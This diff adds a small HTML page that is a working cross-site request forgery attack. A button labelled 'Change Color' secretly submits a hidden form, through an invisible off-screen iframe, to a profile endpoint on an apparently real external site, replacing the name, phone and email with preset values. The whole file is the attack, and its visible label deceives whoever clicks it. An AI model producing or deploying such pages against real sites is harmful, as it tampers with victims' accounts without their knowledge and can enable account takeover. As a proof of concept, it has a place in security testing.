@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<!-- invisible frame -->
+<iframe name="hiddenFrame" style="position:absolute; left:-9999px; width:1px; height:1px; border:0;"></iframe>
+
+<form id="hiddenForm" action="https://binebi.info/ka/profile" method="POST" target="hiddenFrame">
+
+<input type="hidden" name="_token" value="yFJotz316CDziCJSbtxBh1ESrCnEWTu2jE4bA7gt">
+<input type="hidden" name="name" value="koko">
+<input type="hidden" name="last_name" value="bronx">
+<input type="hidden" name="phone" value="555343434">
+<input type="hidden" name="email" value="haha@gmail.com">
+
+</form>
+
+<button onclick="sendRequest()">Change Color</button>
+
+<script>
+function sendRequest(){
+  document.getElementById("hiddenForm").submit();
+}
+</script>
+
+</body>
+</html>
